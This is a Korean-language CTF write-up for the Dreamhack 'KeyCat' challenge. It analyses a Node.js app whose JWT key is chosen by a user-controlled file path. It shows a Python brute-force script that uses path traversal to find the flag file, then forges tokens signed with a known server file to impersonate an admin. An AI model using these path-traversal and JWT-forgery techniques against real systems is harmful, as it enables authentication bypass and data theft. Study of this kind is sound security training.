# Challenge: dreamhack - KeyCat

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/905
flag를 어떻게 구할 수 있을까? /routes/cat.js에서 플래그를 얻을 수 있는 단서가 있다. 특정 조건을 만족하고 /cat/flag와 /cat/admin에 접근했을 때 FLAG_CONTENT_1,2를 얻어낼 수 있다. 그리고 FLAG_CONTENT_1,2는 process.env라는 Node.js에서 환경 변수들을 담는 객체에서 가져오는 것을 알 수 있다.

```javascript
const FLAG_FILE_NAME = process.env.FLAG_FILE_NAME || "flag.txt"
const FLAG_CONTENT_1 = process.env.FLAG_CONTENT_1 || "DH{aaaaaaaaaaaa"
const FLAG_CONTENT_2 = process.env.FLAG_CONTENT_2 || "bbbbbbbbbbbbbbbb}"

...

router.get('/flag', Auth, (req, res) => {

    if (req.filename !== undefined && req.filename.indexOf(FLAG_FILE_NAME) !== -1) {

        return res.status(200).send(`🙀🙀🙀🙀🙀🙀 ${FLAG_CONTENT_1}`);
    }
    else {
        return res.status(401).render("error", { "img_path": '/img/error.png', "err_msg": "Unauthorized..." });
    }
})

router.get('/admin', Auth, (req, res) => {

    if (req.username !== undefined && req.username === 'cat_master') {
        return res.status(200).send(`Hello Cat Master😸 this is for you ${FLAG_CONTENT_2}`);
    }
    else {
        return res.status(403).send("Hello dreamhack! But I've got nothing you want");
    }
})
```

* dockerfile과 entrypoint.sh를 살펴보면 FLAG_CONTENT_1,2를 환경변수에 등록하고 flag.txt를 flag 뒤에 16진수 2자리를 추가해 flagaa.txt와 같이 처리하는 것을 알 수 있다.
```sh
#!/bin/sh

export FLAG_CONTENT_1=$(cat /home/cat/deploy/flag.txt | cut -c 1-34)
export FLAG_CONTENT_2=$(cat /home/cat/deploy/flag.txt | cut -c 35-68)

FLAG=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 2 | head -n 1)

mv /home/cat/deploy/flag.txt /home/cat/deploy/flag$FLAG.txt

export FLAG_FILE_NAME=flag$FLAG.txt

exec "$@"
```
* 종합해보면 Auth라는 미들웨어를 거쳐 각 조건을 만족시켜 환경변수에 등록된 플래그의 값(두 개로 나뉘어져 있음)을 얻어내면 되는 문제이다. 잠깐 auth.js를 보면 req.filename과 req.username을 설정하는 부분이 있어 auth.js의 코드를 중점적으로 봐야할 듯하다.




## 추가 학습



## 문제 풀이
step 1 - 코드 분석
* 루트로 접근했을 때 라우트되는 index.js부터 보자. "/" 경로로 들어온 요청에 대해 Auth 미들웨어를 먼저 실행하고 라우트 핸들러가 동작한다. fn 파라미터를 확인해 sign(filename)으로 새 JWT 토큰을 발급해준다.
    ```javascript
    const { sign } = require('../jwt');
    const router = require('express').Router();
    const { Auth } = require('../middleware/auth')

    router.get('/', Auth, async (req, res) => {

        try {
            const filename = req.query.fn;
            if (filename !== undefined) {
                const token = await sign(filename);
                return res.send(`Hey this is new token ${token}`);
            }
            return res.send('Hi 😺');
        } catch (e) {
            return res.status(404).send('File not found....');
        }
    })
    module.exports = router
    ```
* 미들웨어인 auth.js를 보자. ../jwt에서 sign과 verify 함수를 가져와 먼저 인증을 해주는 구조이다. req.cookies.session, 즉 쿠키에 저장된 session 토큰을 가져와서 없으면 sign("key1")로 새 JWT를 생성해 쿠키에 저장해준다. session 토큰이 설정되어 있으면 verify(TOKEN)으로 토큰을 검증해준다. 성공하면 req 객체에 filename과 username을 추가한다. 따라서 플래그를 얻는 방법은 특정 filename과 username을 포함하도록 TOKEN 쪽을 잘 조작하면서 verify에 성공해야 하는 방향임을 알 수 있다.
    ```javascript
    const { sign, verify } = require('../jwt');

    const Auth = async (req, res, next) => {
        try {
            const TOKEN = req.cookies.session;
            if (TOKEN === undefined) {
                let token = await sign("key1");
                res.cookie('session', token, { maxAge: 3600000 });
                // 인증 통과, 다음 미들웨어나 라우트 핸들러 실행
                return next();
            }

            let { jwt_data, err } = verify(TOKEN);
        
            if (jwt_data !== undefined) {
                req.filename = jwt_data.filename;
                req.username = jwt_data.username;
            }

            if (err) {
                // console.log(err);
                return res.status(401).render("error", { "img_path": '/img/error.png', "err_msg": "Invalid token..." });
            }

            return next();
        } catch (e) {
            // console.log(e);
            return res.status(404).render("error", { "img_path": '/img/error.png', "err_msg": "File not found..." });;
        }
    }

    module.exports = {
        Auth
    }   
    ```

* jwt.js를 열어보자. 키 파일을 열고 그것을 서명 키로 사용해 JWT 토큰을 생성하는 것을 알 수 있다. 즉, 서명에 사용되는 비밀키는 파일의 내용, filename은 키를 가리키는 id이다. 다만, 사용자가 입력한 filename으로 어떤 키 파일을 택할지 선택하기 때문에 filename에 path traversal을 적용할 수 있다.
    ```javascript
    const sign = async (filename) => {
        const KEY = fs.readFileSync(PATH_PREFIX + '/' + filename, 'utf-8');
        return jwt.sign(
            { filename: filename, username: 'dreamhack' },  // 토큰 페이로드
            KEY,                                            // 서명 키 (파일 내용)
            { keyid: filename, algorithm: 'HS256' }        // 토큰 헤더 (kid 포함, 알고리즘 HS256)
        );
    }
    ```
* 검증은 다음과 같다. jwt.verify 함수에 인자로 총 4개가 들어가있다. jwt.verify는 token을 분해해 header, payload, signature를 파싱한다. 파싱된 헤더 객체에서 kid 값을 읽어 secretOrPublicKeyFunc에 넘기면서 호출한다. 
    * token :  검증할 jwt 문자열
    * secretOrpublicKey에는 콜백 함수가 있다. 해당 함수는 JWT 토큰 헤더를 받아서 해당 헤더의 kid 값을 이용해 서명 검증에 사용할 비밀키를 동적으로 로드하는 역할을 한다. 
    * options : HS256 알고리즘
    * 콜백 : 검증 결과를 받을 콜백
    ```javascript
    const verify = (token) => {
        let jwt_data = undefined
        let error = undefined 
        jwt.verify(token, (header, cb) => { cb(null, fs.readFileSync(PATH_PREFIX + '/' + header.kid, 'utf-8')); }, { algorithm: 'HS256' }, (err, data) => {
            error = err;
            jwt_data = data;
        }
        )
        return { 'jwt_data': jwt_data, 'err': error };

    }
    ```

step 2 - 첫번째 플래그 얻기
* 양분된 플래그를 확인하기 위해, 먼저 첫번째 플래그를 확인해보자. /cat/flag에 접근해 Auth 미들웨어를 거치고 (req.filename !== undefined && req.filename.indexOf(FLAG_FILE_NAME) !== -1)를 만족하면 된다. 일반적으로 접근하면 /key/key1에서 "key1"의 filename과 "dremhack"의 username을 가지고 "key1"의 내용을 비밀키로 서명한 토큰이 발급된다. 결국 첫번째 플래그를 얻으려면 filename을 FLAG_FILE_NAME, 즉 "flagxx.txt"(예시)와 같은 진짜 플래그 파일을 포함한 문자열로 변경해 얻은 토큰을 session 쿠키에 넣고 진입해야 한다. 그럼 verify를 거쳐 Auth에서 req.filename에 "~flagxx.txt"가 저장되고 조건문을 통과할 수 있다.
    * expl진짜 flag 파일부터 알아내면 된다. 아래와 같이 익스플로잇 코드를 작성했다. filename에 ../flag{}{} 의 식으로 넣어 get 요청을 보내면 진짜 flag 파일의 이름을 알아낼 수 있다. 이제 "/?fn=해당파일이름" 으로 접근해 출력된 token을 쿠키에 넣고 /cat/flag에 접근하면 플래그를 얻을 수 있다.
    ```python
    import requests

    URL = "http://host8.dreamhack.games:14968/"
    hex_chars = "abcdef0123456789"

    for a in hex_chars:
        for b in hex_chars:
            flag_name = f"flag{a}{b}.txt"
            params = {"fn": f"../{flag_name}"}
            res = requests.get(URL, params=params)
            if "not" not in res.text:
                print(f"flag file name : {flag_name}")
                break
    ```

* 두번째 플래그는 (req.username !== undefined && req.username === 'cat_master') 의 조건을 만족해야 한다. 즉, username도 조작해야 한다. 따라서 jwt token을 직접 만들었다. 서버에서는 filename의 내용을 KEY로 삼아 filename 경로의 파일을 sign해서 token을 만든다. 따라서 내가 Dockerfile의 내용을 알고 서버에서 Dockerfile이 "../Dockerfile" 경로에 있다는 걸 이용하자. filename에 "../Dockerfile"을 입력하고 해당 내용을 KEY에 넣어 encode해서 token을 생성하면 된다. 얻어낸 토큰을 마찬가지로 쿠키에 넣어 /cat/admin에 접근하면 플래그를 얻을 수 있다. 익스플로잇 코드는 exploit2.py에 있다.

## 결과
두 플래그를 얻어서 합치면 원본 플래그를 얻을 수 있다. 첫번째 플래그는 filename을 path traversal로 조작해서 간단히 얻어낼 수 있고, 두 번째 플래그는 path traversal와 서버의 jwt sign, verify 로직을 이용해 얻어낼 수 있다. 서버가 가지고 있는 파일(내가 그 파일 내용을 알아야 함)에 접근해 해당 KEY로 직접 토큰을 만들어 얻어낼 수 있다. 